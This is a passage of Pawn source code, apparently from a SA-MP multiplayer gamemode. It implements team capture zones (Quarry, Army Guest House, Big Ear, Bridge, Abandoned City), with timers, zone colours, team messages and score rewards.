			    else if(tCP[QUARRY] == TEAM_SOVIET)
			    {
			      SendClientMessage(playerid, COLOR_YELLOW,"[ZONE]This flag is being controlled by team "COL_RED"<SOVIET>");
			      SendTeamMessage(TEAM_SOVIET, green,"*Quarry is under attack!");
				}
				else if(tCP[QUARRY] == TEAM_USA)
				{
				  SendClientMessage(playerid, COLOR_YELLOW,"[ZONE]This flag is being controlled by team "COL_RED"<USA>");
				  SendTeamMessage(TEAM_USA, green,"*Quarry is under attack!");
				}
					else if(tCP[QUARRY] == TEAM_MARVEL)
				{
				  SendClientMessage(playerid, COLOR_YELLOW,"[ZONE]This flag is being controlled by team "COL_RED"<VIETNAM>");
				  SendTeamMessage(TEAM_MARVEL, green,"*Quarry is under attack!");
				}
				else if(tCP[QUARRY] == TEAM_AUS)
				{
			      SendClientMessage(playerid, COLOR_YELLOW,"[ZONE]This flag is being controlled by team "COL_RED"<AUSTRALIA>");
			      SendTeamMessage(TEAM_AUS, green,"*Quarry is under attack!");
				}
				else if(tCP[QUARRY] == TEAM_NONE)
				{
			      SendClientMessage(playerid, red,"This flag is currently not controlled by any team");
				}
				//---------loop-------//
				foreach(Player, i)
				{
				   IsPlayerCapturing[i][QUARRY] = 1;
				}
			}
			else return CaptureZoneMessage(playerid, 1);
		}
		else return CaptureZoneMessage(playerid, 2);
	}
	else return CaptureZoneMessage(playerid, 3);
	return 1;
}
stock QuarryCaptured(playerid)
{for(new num = 0; num < 4; num ++)
	{ TextDrawHideForPlayer(playerid, ZoneTextdraw_[num][playerid]); }
	Captured[playerid][QUARRY] = 1;
	UnderAttack[QUARRY] = 0;
	KillTimer(timer[playerid][QUARRY]);
    TextDrawHideForPlayer(playerid, CountText[playerid]);
    CountVar[playerid][QUARRY] = 25;
    GivePlayerScore(playerid, 5);
    GivePlayerMoney(playerid, 5000);
    SendClientMessage(playerid, COLOR_WHITE,"[ZONE-REWARD]You got +5 scores and +$5000 cash for the capture of this area!");
    GameTextForPlayer(playerid,"~g~CAPTURED!",4000,5);
	//==========================================================================
	foreach(Player, i)
	{
	   IsPlayerCapturing[i][QUARRY] = 0;
	   if(gTeam[i] == gTeam[playerid] && i != playerid && PlayerInfo[i][OnDuty] == 0)
	   {
		   SendClientMessage(i, yellow,""cyellow"[ZONE]Your team has sucessfully captured "cred"Quarry"cwhite"! You received +1 score for it!");
		   GivePlayerScore(i, 1);
	   }
	}
	//==========================================================================
	tCP[QUARRY] = gTeam[playerid];
	GangZoneStopFlashForAll(Zone[QUARRY]);
	//==========================================================================
	if(gTeam[playerid] == TEAM_EURASIA)
    {
	   GangZoneShowForAll(Zone[QUARRY], TEAM_ZONE_EURASIA_COLOR);
	}
	else if(gTeam[playerid] == TEAM_ARAB)
	{
       GangZoneShowForAll(Zone[QUARRY], TEAM_ZONE_ARAB_COLOR);
	}
	else if(gTeam[playerid] == TEAM_SOVIET)
	{
	   GangZoneShowForAll(Zone[QUARRY], TEAM_ZONE_SOVIET_COLOR);
	}
	else if(gTeam[playerid] == TEAM_USA)
	{
	   GangZoneShowForAll(Zone[QUARRY], TEAM_ZONE_USA_COLOR);
	}
	else if(gTeam[playerid] == TEAM_AUS)
    {
	   GangZoneShowForAll(Zone[QUARRY], TEAM_ZONE_AUS_COLOR);
    }
   	else if(gTeam[playerid] == TEAM_MARVEL)
    {
	   GangZoneShowForAll(Zone[QUARRY], TEAM_ZONE_MARVEL_COLOR);
    }
    //==========================================================================
    new str[128];
    format(str, sizeof(str),"y~[ZONE]%s has captured ~b~Quarry ~p~for team ~w~%s", pName(playerid), GetTeamName(playerid));
    SendBoxMessage(str);
    #if defined IRCENABLED
    format(str, sizeof(str),"3[ZONE]4%s has captured 9Quarry 4 for team %s", pName(playerid), GetTeamName(playerid));
    IRC_GroupSay(gGroupID, IRC_CHANNEL, str);
    #endif
    return 1;
}
stock LeavingQuarry(playerid)
{for(new num = 0; num < 4; num ++)
	{ TextDrawHideForPlayer(playerid, ZoneTextdraw_[num][playerid]); }
	Captured[playerid][QUARRY] = 1;
	UnderAttack[QUARRY] = 0;
	KillTimer(timer[playerid][QUARRY]);
    TextDrawHideForPlayer(playerid, CountText[playerid]);
    CountVar[playerid][QUARRY] = 25;
    GangZoneStopFlashForAll(Zone[QUARRY]);
    foreach(Player, i)
	{
	   IsPlayerCapturing[i][QUARRY] = 0;
	}
	PlayAudioStreamForPlayer(playerid,"http://files.mboxdrive.com/100000856487902/WR_StoleFlag.wav");
	SendClientMessage(playerid, red,"*You have been failed to capture this zone!");
	GameTextForPlayer(playerid,"~R~FAILED TO CAPTURE",4000,5);
	return 1;
}
forward Quarry(playerid);
public Quarry(playerid)
{
	QuarryCaptured(playerid);
	return 1;
}
//==============================================================================
stock ActiveGuest(playerid)
{
	if(Spectating[playerid] == 0 || PlayerInfo[playerid][OnDuty] == 0)
	{
		if(UnderAttack[GUEST] == 0)
		{
			if(!IsPlayerInAnyVehicle(playerid))
		 	{for(new num = 0; num < 4; num ++)
				{ TextDrawShowForPlayer(playerid, ZoneTextdraw_[num][playerid]); }
			 	UnderAttack[GUEST] = 1;
			 	timer[playerid][GUEST] = SetTimerEx("Guest", 25000, false,"i",playerid);
			 	Captured[playerid][GUEST] = 0;
			 	SendClientMessage(playerid, C_PINK,"[ZONE]Stay in this checkpoint for 25 seconds to capture it and earn score! ");
			 	GameTextForPlayer(playerid,"~y~CAPTURING...",4000,5);
             	if(gTeam[playerid] == TEAM_EURASIA)
			    {
				  GangZoneFlashForAll(Zone[GUEST], TEAM_ZONE_EURASIA_COLOR);
				}
				else if(gTeam[playerid] == TEAM_ARAB)
				{
			      GangZoneFlashForAll(Zone[GUEST], TEAM_ZONE_ARAB_COLOR);
			    }
			    else if(gTeam[playerid] == TEAM_SOVIET)
			    {
			      GangZoneFlashForAll(Zone[GUEST], TEAM_ZONE_SOVIET_COLOR);
				}
				else if(gTeam[playerid] == TEAM_USA)
				{
			      GangZoneFlashForAll(Zone[GUEST], TEAM_ZONE_USA_COLOR);
				}
				else if(gTeam[playerid] == TEAM_AUS)
				{
			      GangZoneFlashForAll(Zone[GUEST], TEAM_ZONE_AUS_COLOR);
				}
					else if(gTeam[playerid] == TEAM_MARVEL)
				{
			      GangZoneFlashForAll(Zone[GUEST], TEAM_ZONE_MARVEL_COLOR);
				}
				//------Message-----
			    if(tCP[GUEST] == TEAM_EURASIA)
			    {
			      SendClientMessage(playerid, COLOR_YELLOW,"[ZONE]This flag is being controlled by team "COL_RED"<EURASIA>");
			      SendTeamMessage(TEAM_EURASIA, green,"Army Guest House is under attack!");
			    }
			    else if(tCP[GUEST] == TEAM_ARAB)
			    {
			      SendClientMessage(playerid, COLOR_YELLOW,"[ZONE]This flag is being controlled by team "COL_RED"<ARAB>");
			      SendTeamMessage(TEAM_ARAB, green,"*Army Guest House is under attack!");
			    }
			    else if(tCP[GUEST] == TEAM_SOVIET)
			    {
			      SendClientMessage(playerid, COLOR_YELLOW,"[ZONE]This flag is being controlled by team "COL_RED"<SOVIET>");
			      SendTeamMessage(TEAM_SOVIET, green,"*Army Guest House is under attack!");
				}
				else if(tCP[GUEST] == TEAM_USA)
				{
				  SendClientMessage(playerid, COLOR_YELLOW,"[ZONE]This flag is being controlled by team "COL_RED"<USA>");
				  SendTeamMessage(TEAM_USA, green,"*Army Guest House is under attack!");
				}
				else if(tCP[GUEST] == TEAM_AUS)
				{
			      SendClientMessage(playerid, COLOR_YELLOW,"[ZONE]This flag is being controlled by team "COL_RED"<AUSTRALIA>");
			      SendTeamMessage(TEAM_AUS, green,"*Army Guest House is under attack!");
				}
					else if(tCP[GUEST] == TEAM_MARVEL)
				{
			      SendClientMessage(playerid, COLOR_YELLOW,"[ZONE]This flag is being controlled by team "COL_RED"<VIETNAM>");
			      SendTeamMessage(TEAM_MARVEL, green,"*Army Guest House is under attack!");
				}
				else if(tCP[GUEST] == TEAM_NONE)
				{
			      SendClientMessage(playerid, red,"This flag is currently not controlled by any team");
				}
				//---------loop-------//
				foreach(Player, i)
				{
				   IsPlayerCapturing[i][GUEST] = 1;
				}
			}
			else return CaptureZoneMessage(playerid, 1);
		}
		else return CaptureZoneMessage(playerid, 2);
	}
	else return CaptureZoneMessage(playerid, 3);
	return 1;
}
stock GuestCaptured(playerid)
{for(new num = 0; num < 4; num ++)
	{ TextDrawHideForPlayer(playerid, ZoneTextdraw_[num][playerid]); }
	Captured[playerid][GUEST] = 1;
	UnderAttack[GUEST] = 0;
	KillTimer(timer[playerid][GUEST]);
    TextDrawHideForPlayer(playerid, CountText[playerid]);
    CountVar[playerid][GUEST] = 25;
    GivePlayerScore(playerid, 5);
    GivePlayerMoney(playerid, 5000);
    SendClientMessage(playerid, COLOR_WHITE,"[ZONE-REWARD]You got +5 scores and +$5000 cash for the capture of this area!");
    GameTextForPlayer(playerid,"~g~CAPTURED!",4000,5);
	//==========================================================================
	foreach(Player, i)
	{
	   IsPlayerCapturing[i][GUEST] = 0;
	   if(gTeam[i] == gTeam[playerid] && i != playerid && PlayerInfo[i][OnDuty] == 0)
	   {
		   SendClientMessage(i, yellow,""cyellow"[ZONE]Your team has sucessfully captured "cred"Army Guest House"cwhite"! You received +1 score for it!");
		   GivePlayerScore(i, 1);
	   }
	}
	//==========================================================================
	tCP[GUEST] = gTeam[playerid];
	GangZoneStopFlashForAll(Zone[GUEST]);
	//==========================================================================
	if(gTeam[playerid] == TEAM_EURASIA)
    {
	   GangZoneShowForAll(Zone[GUEST], TEAM_ZONE_EURASIA_COLOR);
	}
	else if(gTeam[playerid] == TEAM_ARAB)
	{
       GangZoneShowForAll(Zone[GUEST], TEAM_ZONE_ARAB_COLOR);
	}
	else if(gTeam[playerid] == TEAM_SOVIET)
	{
	   GangZoneShowForAll(Zone[GUEST], TEAM_ZONE_SOVIET_COLOR);
	}
	else if(gTeam[playerid] == TEAM_USA)
	{
	   GangZoneShowForAll(Zone[GUEST], TEAM_ZONE_USA_COLOR);
	}
	else if(gTeam[playerid] == TEAM_AUS)
    {
	   GangZoneShowForAll(Zone[GUEST], TEAM_ZONE_AUS_COLOR);
    }
    	else if(gTeam[playerid] == TEAM_MARVEL)
    {
	   GangZoneShowForAll(Zone[GUEST], TEAM_ZONE_MARVEL_COLOR);
    }
    //==========================================================================
    new str[128];
    format(str, sizeof(str),"y~[ZONE]%s has captured ~b~Army Guest House ~p~for team ~w~%s", pName(playerid), GetTeamName(playerid));
    SendBoxMessage(str);
    #if defined IRCENABLED
    format(str, sizeof(str),"3[ZONE]4%s has captured 9Army Guest House 4 for team %s", pName(playerid), GetTeamName(playerid));
    IRC_GroupSay(gGroupID, IRC_CHANNEL, str);
    #endif
    return 1;
}
stock LeavingGuest(playerid)
{for(new num = 0; num < 4; num ++)
	{ TextDrawHideForPlayer(playerid, ZoneTextdraw_[num][playerid]); }
	Captured[playerid][GUEST] = 1;
	UnderAttack[GUEST] = 0;
	KillTimer(timer[playerid][GUEST]);
    TextDrawHideForPlayer(playerid, CountText[playerid]);
    CountVar[playerid][GUEST] = 25;
    GangZoneStopFlashForAll(Zone[GUEST]);
    foreach(Player, i)
	{
	   IsPlayerCapturing[i][GUEST] = 0;
	}
	PlayAudioStreamForPlayer(playerid,"http://files.mboxdrive.com/100000856487902/WR_StoleFlag.wav");
	SendClientMessage(playerid, red,"*You have been failed to capture this zone!");
	GameTextForPlayer(playerid,"~R~FAILED TO CAPTURE",4000,5);
	return 1;
}
forward Guest(playerid);
public Guest(playerid)
{
	GuestCaptured(playerid);
	return 1;
}
//==============================================================================
stock ActiveEar(playerid)
{
	if(Spectating[playerid] == 0 || PlayerInfo[playerid][OnDuty] == 0)
	{
		if(UnderAttack[EAR] == 0)
		{
			if(!IsPlayerInAnyVehicle(playerid))
		 	{for(new num = 0; num < 4; num ++)
				{ TextDrawShowForPlayer(playerid, ZoneTextdraw_[num][playerid]); }
			 	UnderAttack[EAR] = 1;
			 	timer[playerid][EAR] = SetTimerEx("BigEar", 25000, false,"i",playerid);
			 	Captured[playerid][EAR] = 0;
			 	SendClientMessage(playerid, C_PINK,"[ZONE]Stay in this checkpoint for 25 seconds to capture it and earn score! ");
			 	GameTextForPlayer(playerid,"~y~CAPTURING...",4000,5);
             	if(gTeam[playerid] == TEAM_EURASIA)
			    {
				  GangZoneFlashForAll(Zone[EAR], TEAM_ZONE_EURASIA_COLOR);
				}
				else if(gTeam[playerid] == TEAM_ARAB)
				{
			      GangZoneFlashForAll(Zone[EAR], TEAM_ZONE_ARAB_COLOR);
			    }
			    else if(gTeam[playerid] == TEAM_SOVIET)
			    {
			      GangZoneFlashForAll(Zone[EAR], TEAM_ZONE_SOVIET_COLOR);
				}
				else if(gTeam[playerid] == TEAM_USA)
				{
			      GangZoneFlashForAll(Zone[EAR], TEAM_ZONE_USA_COLOR);
				}
				else if(gTeam[playerid] == TEAM_AUS)
				{
			      GangZoneFlashForAll(Zone[EAR], TEAM_ZONE_AUS_COLOR);
				}
				else if(gTeam[playerid] == TEAM_MARVEL)
				{
			      GangZoneFlashForAll(Zone[EAR], TEAM_ZONE_MARVEL_COLOR);
				}
				//------Message-----
			    if(tCP[EAR] == TEAM_EURASIA)
			    {
			      SendClientMessage(playerid, COLOR_YELLOW,"[ZONE]This flag is being controlled by team "COL_RED"<EURASIA>");
			      SendTeamMessage(TEAM_EURASIA, green,"*Big Ear is under attack!");
			    }
			    else if(tCP[EAR] == TEAM_ARAB)
			    {
			      SendClientMessage(playerid, COLOR_YELLOW,"[ZONE]This flag is being controlled by team "COL_RED"<ARAB>");
			      SendTeamMessage(TEAM_ARAB, green,"*Big Ear is under attack!");
			    }
			    else if(tCP[EAR] == TEAM_SOVIET)
			    {
			      SendClientMessage(playerid, COLOR_YELLOW,"[ZONE]This flag is being controlled by team "COL_RED"<SOVIET>");
			      SendTeamMessage(TEAM_SOVIET, green,"*Big Ear is under attack!");
				}
          	else if(tCP[EAR] == TEAM_USA)
				{
				  SendClientMessage(playerid, COLOR_YELLOW,"[ZONE]This flag is being controlled by team "COL_RED"<USA>");
				  SendTeamMessage(TEAM_USA, green,"*Big Ear is under attack!");
				}
				else if(tCP[EAR] == TEAM_AUS)
				{
			      SendClientMessage(playerid, COLOR_YELLOW,"[ZONE]This flag is being controlled by team "COL_RED"<AUSTRALIA>");
			      SendTeamMessage(TEAM_AUS, green,"*Big Ear is under attack!");
				}
				else if(tCP[EAR] == TEAM_MARVEL)
				{
			      SendClientMessage(playerid, COLOR_YELLOW,"[ZONE]This flag is being controlled by team "COL_RED"<VIETNAM>");
			      SendTeamMessage(TEAM_MARVEL, green,"*Big Ear is under attack!");
				}

				else if(tCP[EAR] == TEAM_NONE)
				{
			      SendClientMessage(playerid, red,"This flag is currently not controlled by any team");
				}
				//---------loop-------//
				foreach(Player, i)
				{
				   IsPlayerCapturing[i][EAR] = 1;
				}
			}
			else return CaptureZoneMessage(playerid, 1);
		}
		else return CaptureZoneMessage(playerid, 2);
	}
	else return CaptureZoneMessage(playerid, 3);
	return 1;
}
stock EarCaptured(playerid)
{for(new num = 0; num < 4; num ++)
	{ TextDrawHideForPlayer(playerid, ZoneTextdraw_[num][playerid]); }
	Captured[playerid][EAR] = 1;
	UnderAttack[EAR] = 0;
	KillTimer(timer[playerid][EAR]);
    TextDrawHideForPlayer(playerid, CountText[playerid]);
    CountVar[playerid][EAR] = 25;
	GivePlayerScore(playerid, 5);
    GivePlayerMoney(playerid, 5000);
    SendClientMessage(playerid, COLOR_WHITE,"[ZONE-REWARD]You got +5 scores and +$5000 cash for the capture of this area!");
    GameTextForPlayer(playerid,"~g~CAPTURED!",4000,5);
	//==========================================================================
	foreach(Player, i)
	{
	   IsPlayerCapturing[i][EAR] = 0;
	   if(gTeam[i] == gTeam[playerid] && i != playerid && PlayerInfo[i][OnDuty] == 0)
	   {
		   SendClientMessage(i, yellow,""cyellow"[ZONE]Your team has sucessfully captured "cred"Big Ear"cwhite"! You received +1 score for it!");
		   GivePlayerScore(i, 1);
	   }
	}
	//==========================================================================
	tCP[EAR] = gTeam[playerid];
	GangZoneStopFlashForAll(Zone[EAR]);
	//==========================================================================
	if(gTeam[playerid] == TEAM_EURASIA)
    {
	   GangZoneShowForAll(Zone[EAR], TEAM_ZONE_EURASIA_COLOR);
	}
	else if(gTeam[playerid] == TEAM_ARAB)
	{
       GangZoneShowForAll(Zone[EAR], TEAM_ZONE_ARAB_COLOR);
	}
	else if(gTeam[playerid] == TEAM_SOVIET)
	{
	   GangZoneShowForAll(Zone[EAR], TEAM_ZONE_SOVIET_COLOR);
	}
	else if(gTeam[playerid] == TEAM_USA)
	{
	   GangZoneShowForAll(Zone[EAR], TEAM_ZONE_USA_COLOR);
	}
	else if(gTeam[playerid] == TEAM_AUS)
    {
	   GangZoneShowForAll(Zone[EAR], TEAM_ZONE_AUS_COLOR);
    }
    else if(gTeam[playerid] == TEAM_MARVEL)
    {
	   GangZoneShowForAll(Zone[EAR], TEAM_ZONE_MARVEL_COLOR);
    }
    //==========================================================================
    new str[128];
    format(str, sizeof(str),"y~[ZONE]%s has captured ~b~Big Ear ~p~for team ~w~%s", pName(playerid), GetTeamName(playerid));
    SendBoxMessage(str);
    #if defined IRCENABLED
    format(str, sizeof(str),"3[ZONE]4%s has captured 9Big Ear 4 for team %s", pName(playerid), GetTeamName(playerid));
    IRC_GroupSay(gGroupID, IRC_CHANNEL, str);
    #endif
	return 1;
}
stock LeavingEar(playerid)
{for(new num = 0; num < 4; num ++)
	{ TextDrawHideForPlayer(playerid, ZoneTextdraw_[num][playerid]); }
	Captured[playerid][EAR] = 1;
	UnderAttack[EAR] = 0;
	KillTimer(timer[playerid][EAR]);
    TextDrawHideForPlayer(playerid, CountText[playerid]);
    CountVar[playerid][EAR] = 25;
    GangZoneStopFlashForAll(Zone[EAR]);
    foreach(Player, i)
	{
	   IsPlayerCapturing[i][EAR] = 0;
	}
	PlayAudioStreamForPlayer(playerid,"http://files.mboxdrive.com/100000856487902/WR_StoleFlag.wav");
	SendClientMessage(playerid, red,"*You have been failed to capture this zone!");
	GameTextForPlayer(playerid,"~R~FAILED TO CAPTURE",4000,5);
	return 1;
}
forward BigEar(playerid);
public BigEar(playerid)
{
	EarCaptured(playerid);
	return 1;
}
stock ActiveBridge(playerid)
{
	if(Spectating[playerid] == 0 || PlayerInfo[playerid][OnDuty] == 0 || gTeam[playerid] != TEAM_MERC)
	{
		if(UnderAttack[BRIDGE] == 0)
		{
			if(!IsPlayerInAnyVehicle(playerid))
		 	{for(new num = 0; num < 4; num ++)
				{ TextDrawShowForPlayer(playerid, ZoneTextdraw_[num][playerid]); }
			 	UnderAttack[BRIDGE] = 1;
			 	timer[playerid][BRIDGE] = SetTimerEx("Bridge", 25000, false,"i",playerid);
			 	Captured[playerid][BRIDGE] = 0;
			 	SendClientMessage(playerid, C_PINK,"[ZONE]Stay in this checkpoint for 25 seconds to capture it and earn score! ");
			 	GameTextForPlayer(playerid,"~y~CAPTURING...",4000,5);
             	if(gTeam[playerid] == TEAM_EURASIA)
			    {
				  GangZoneFlashForAll(Zone[BRIDGE], TEAM_ZONE_EURASIA_COLOR);
				}
				else if(gTeam[playerid] == TEAM_ARAB)
				{
			      GangZoneFlashForAll(Zone[BRIDGE], TEAM_ZONE_ARAB_COLOR);
			    }
			    else if(gTeam[playerid] == TEAM_SOVIET)
			    {
			      GangZoneFlashForAll(Zone[BRIDGE], TEAM_ZONE_SOVIET_COLOR);
				}
				else if(gTeam[playerid] == TEAM_USA)
				{
			      GangZoneFlashForAll(Zone[BRIDGE], TEAM_ZONE_USA_COLOR);
				}
				else if(gTeam[playerid] == TEAM_AUS)
				{
			      GangZoneFlashForAll(Zone[BRIDGE], TEAM_ZONE_AUS_COLOR);
				}
				//------Message-----
			    if(tCP[BRIDGE] == TEAM_EURASIA)
			    {
			      SendClientMessage(playerid, COLOR_YELLOW,"[ZONE]This flag is being controlled by team "COL_RED"<ASIA>");
			      SendTeamMessage(TEAM_EURASIA, green,"*Bridge is under attack!");
			    }
			    else if(tCP[BRIDGE] == TEAM_ARAB)
			    {
			      SendClientMessage(playerid, COLOR_YELLOW,"[ZONE]This flag is being controlled by team "COL_RED"<ARAB>");
			      SendTeamMessage(TEAM_ARAB, green,"*Bridge is under attack!");
			    }
			    else if(tCP[BRIDGE] == TEAM_SOVIET)
			    {
			      SendClientMessage(playerid, COLOR_YELLOW,"[ZONE]This flag is being controlled by team "COL_RED"<SOVIET>");
			      SendTeamMessage(TEAM_SOVIET, green,"*Bridge is under attack!");
				}
				else if(tCP[BRIDGE] == TEAM_USA)
				{
				  SendClientMessage(playerid, COLOR_YELLOW,"[ZONE]This flag is being controlled by team "COL_RED"<USA>");
				  SendTeamMessage(TEAM_USA, green,"*Bridge is under attack!");
				}
				else if(tCP[BRIDGE] == TEAM_AUS)
				{
			      SendClientMessage(playerid, COLOR_YELLOW,"[ZONE]This flag is being controlled by team "COL_RED"<AUSTRALIA>");
			      SendTeamMessage(TEAM_AUS, green,"*Bridge is under attack!");
				}
				else if(tCP[BRIDGE] == TEAM_NONE)
				{
			      SendClientMessage(playerid, red,"This flag is currently not controlled by any team");
				}
				//---------loop-------//
				foreach(Player, i)
				{
				   IsPlayerCapturing[i][BRIDGE] = 1;
				}
			}
			else return CaptureZoneMessage(playerid, 1);
		}
		else return CaptureZoneMessage(playerid, 2);
	}
	else return CaptureZoneMessage(playerid, 3);
	return 1;
}
stock BridgeCaptured(playerid)
{for(new num = 0; num < 4; num ++)
	{ TextDrawHideForPlayer(playerid, ZoneTextdraw_[num][playerid]); }
	Captured[playerid][BRIDGE] = 1;
	UnderAttack[BRIDGE] = 0;
	KillTimer(timer[playerid][BRIDGE]);
    TextDrawHideForPlayer(playerid, CountText[playerid]);
    CountVar[playerid][BRIDGE] = 25;
	GivePlayerScore(playerid, 5);
    GivePlayerMoney(playerid, 5000);
    TextDrawShowForPlayer(playerid, Rank1[playerid]);
	SendClientMessage(playerid, COLOR_WHITE,"[ZONE-REWARD]You got +5 scores and +$5000 cash for the capture of this area!");
    GameTextForPlayer(playerid,"~g~CAPTURED!",4000,5);
	//==========================================================================
	foreach(Player, i)
	{
	   IsPlayerCapturing[i][BRIDGE] = 0;
	   if(gTeam[i] == gTeam[playerid] && i != playerid && PlayerInfo[i][OnDuty] == 0)
	   {
		   SendClientMessage(i, yellow,""cyellow"[ZONE]Your team has sucessfully captured "cred"Bridge"cwhite"! You received +1 score for it!");
		   GivePlayerScore(i, 1);
	   }
	}
	//==========================================================================
	tCP[BRIDGE] = gTeam[playerid];
	GangZoneStopFlashForAll(Zone[BRIDGE]);
	//==========================================================================
	if(gTeam[playerid] == TEAM_EURASIA)
    {
	   GangZoneShowForAll(Zone[BRIDGE], TEAM_ZONE_EURASIA_COLOR);
	}
	else if(gTeam[playerid] == TEAM_ARAB)
	{
       GangZoneShowForAll(Zone[BRIDGE], TEAM_ZONE_ARAB_COLOR);
	}
	else if(gTeam[playerid] == TEAM_SOVIET)
	{
	   GangZoneShowForAll(Zone[BRIDGE], TEAM_ZONE_SOVIET_COLOR);
	}
	else if(gTeam[playerid] == TEAM_USA)
	{
	   GangZoneShowForAll(Zone[BRIDGE], TEAM_ZONE_USA_COLOR);
	}
	else if(gTeam[playerid] == TEAM_AUS)
    {
	   GangZoneShowForAll(Zone[BRIDGE], TEAM_ZONE_AUS_COLOR);
    }
    //==========================================================================
    new str[128];
    format(str, sizeof(str),"y~[ZONE]%s has captured ~b~Bridge ~p~for team ~w~%s", pName(playerid), GetTeamName(playerid));
    SendBoxMessage(str);
    #if defined IRCENABLED
    format(str, sizeof(str),"3[ZONE]4%s has captured 9Bridge 4 for team %s", pName(playerid), GetTeamName(playerid));
    IRC_GroupSay(gGroupID, IRC_CHANNEL, str);
    #endif
	return 1;
}
stock LeavingBridge(playerid)
{for(new num = 0; num < 4; num ++)
	{ TextDrawHideForPlayer(playerid, ZoneTextdraw_[num][playerid]); }
	Captured[playerid][BRIDGE] = 1;
	UnderAttack[BRIDGE] = 0;
	KillTimer(timer[playerid][BRIDGE]);
    TextDrawHideForPlayer(playerid, CountText[playerid]);
    CountVar[playerid][BRIDGE] = 25;
    GangZoneStopFlashForAll(Zone[BRIDGE]);
    foreach(Player, i)
	{
	   IsPlayerCapturing[i][BRIDGE] = 0;
	}
	PlayAudioStreamForPlayer(playerid,"http://files.mboxdrive.com/100000856487902/WR_StoleFlag.wav");
	SendClientMessage(playerid, red,"*You have been failed to capture this zone!");
	GameTextForPlayer(playerid,"~R~FAILED TO CAPTURE",4000,5);
	return 1;
}
forward Bridge(playerid);
public Bridge(playerid)
{
	BridgeCaptured(playerid);
	return 1;
}
//==============================================================================

stock ActiveCity(playerid)
{
	if(Spectating[playerid] == 0 || PlayerInfo[playerid][OnDuty] == 0 || gTeam[playerid] != TEAM_MERC)
	{
		if(UnderAttack[CITY] == 0)
		{
			if(!IsPlayerInAnyVehicle(playerid))
		 	{for(new num = 0; num < 4; num ++)
				{ TextDrawShowForPlayer(playerid, ZoneTextdraw_[num][playerid]); }
			 	UnderAttack[CITY] = 1;
			 	timer[playerid][CITY] = SetTimerEx("City", 25000, false,"i",playerid);
			 	Captured[playerid][CITY] = 0;
			 	SendClientMessage(playerid, C_PINK,"[ZONE]Stay in this checkpoint for 25 seconds to capture it and earn score! ");
			 	GameTextForPlayer(playerid,"~y~CAPTURING...",4000,5);
             	if(gTeam[playerid] == TEAM_EURASIA)
			    {
				  GangZoneFlashForAll(Zone[CITY], TEAM_ZONE_EURASIA_COLOR);
				}
				else if(gTeam[playerid] == TEAM_ARAB)
				{
			      GangZoneFlashForAll(Zone[CITY], TEAM_ZONE_ARAB_COLOR);
			    }
			    else if(gTeam[playerid] == TEAM_SOVIET)
			    {
			      GangZoneFlashForAll(Zone[CITY], TEAM_ZONE_SOVIET_COLOR);
				}
				else if(gTeam[playerid] == TEAM_USA)
				{
			      GangZoneFlashForAll(Zone[CITY], TEAM_ZONE_USA_COLOR);
				}
				else if(gTeam[playerid] == TEAM_AUS)
				{
			      GangZoneFlashForAll(Zone[CITY], TEAM_ZONE_AUS_COLOR);
				}
				//------Message-----
			    if(tCP[CITY] == TEAM_EURASIA)
			    {
			      SendClientMessage(playerid, COLOR_YELLOW,"[ZONE]This flag is being controlled by team "COL_RED"<ASIA>");
			      SendTeamMessage(TEAM_EURASIA, green,"*Abondoned City is under attack!");
			    }
			    else if(tCP[CITY] == TEAM_ARAB)
			    {
			      SendClientMessage(playerid, COLOR_YELLOW,"[ZONE]This flag is being controlled by team "COL_RED"<ARAB>");
			      SendTeamMessage(TEAM_ARAB, green,"*Abondoned City is under attack!");
			    }
			    else if(tCP[CITY] == TEAM_SOVIET)
			    {
			      SendClientMessage(playerid, COLOR_YELLOW,"[ZONE]This flag is being controlled by team "COL_RED"<SOVIET>");
			      SendTeamMessage(TEAM_SOVIET, green,"*Abondoned City is under attack!");
				}
				else if(tCP[CITY] == TEAM_USA)
				{
				  SendClientMessage(playerid, COLOR_YELLOW,"[ZONE]This flag is being controlled by team "COL_RED"<USA>");
				  SendTeamMessage(TEAM_USA, green,"*Abondoned City is under attack!");
				}
				else if(tCP[CITY] == TEAM_AUS)
				{
			      SendClientMessage(playerid, COLOR_YELLOW,"[ZONE]This flag is being controlled by team "COL_RED"<AUSTRALIA>");
			      SendTeamMessage(TEAM_AUS, green,"*Abondoned City is under attack!");
				}
				else if(tCP[CITY] == TEAM_NONE)
				{
			      SendClientMessage(playerid, red,"This flag is currently not controlled by any team");
				}
				//---------loop-------//
				foreach(Player, i)
				{
				   IsPlayerCapturing[i][CITY] = 1;
				}
			}
			else return CaptureZoneMessage(playerid, 1);
		}
		else return CaptureZoneMessage(playerid, 2);
	}
	else return CaptureZoneMessage(playerid, 3);
	return 1;
}
stock CityCaptured(playerid)
{for(new num = 0; num < 4; num ++)
	{ TextDrawHideForPlayer(playerid, ZoneTextdraw_[num][playerid]); }
	Captured[playerid][CITY] = 1;
	UnderAttack[CITY] = 0;
	KillTimer(timer[playerid][CITY]);
    TextDrawHideForPlayer(playerid, CountText[playerid]);
    CountVar[playerid][CITY] = 25;
	GivePlayerScore(playerid, 5);
    GivePlayerMoney(playerid, 5000);
    TextDrawShowForPlayer(playerid, Rank1[playerid]);
	SendClientMessage(playerid, COLOR_WHITE,"[ZONE-REWARD]You got +5 scores and +$5000 cash for the capture of this area!");
    GameTextForPlayer(playerid,"~g~CAPTURED!",4000,5);
	//==========================================================================
	foreach(Player, i)
	{
	   	IsPlayerCapturing[i][CITY] = 0;
	   	if(gTeam[i] == gTeam[playerid] && i != playerid && PlayerInfo[i][OnDuty] == 0)
	   	{
		   	SendClientMessage(i, yellow,""cyellow"[ZONE]Your team has sucessfully captured "cred"Abondoned City"cwhite"! You received +1 score for it!");
		   	GivePlayerScore(i, 1);
	   	}
	}
	//==========================================================================
	tCP[CITY] = gTeam[playerid];
	GangZoneStopFlashForAll(Zone[CITY]);
	//==========================================================================
	if(gTeam[playerid] == TEAM_EURASIA)
    {
	   GangZoneShowForAll(Zone[CITY], TEAM_ZONE_EURASIA_COLOR);
	}
	else if(gTeam[playerid] == TEAM_ARAB)
	{
       GangZoneShowForAll(Zone[CITY], TEAM_ZONE_ARAB_COLOR);
	}
	else if(gTeam[playerid] == TEAM_SOVIET)
	{
	   GangZoneShowForAll(Zone[CITY], TEAM_ZONE_SOVIET_COLOR);
	}
	else if(gTeam[playerid] == TEAM_USA)
	{
	   GangZoneShowForAll(Zone[CITY], TEAM_ZONE_USA_COLOR);
	}
	else if(gTeam[playerid] == TEAM_AUS)
    {
	   GangZoneShowForAll(Zone[CITY], TEAM_ZONE_AUS_COLOR);
    }
    //==========================================================================
    new str[128];
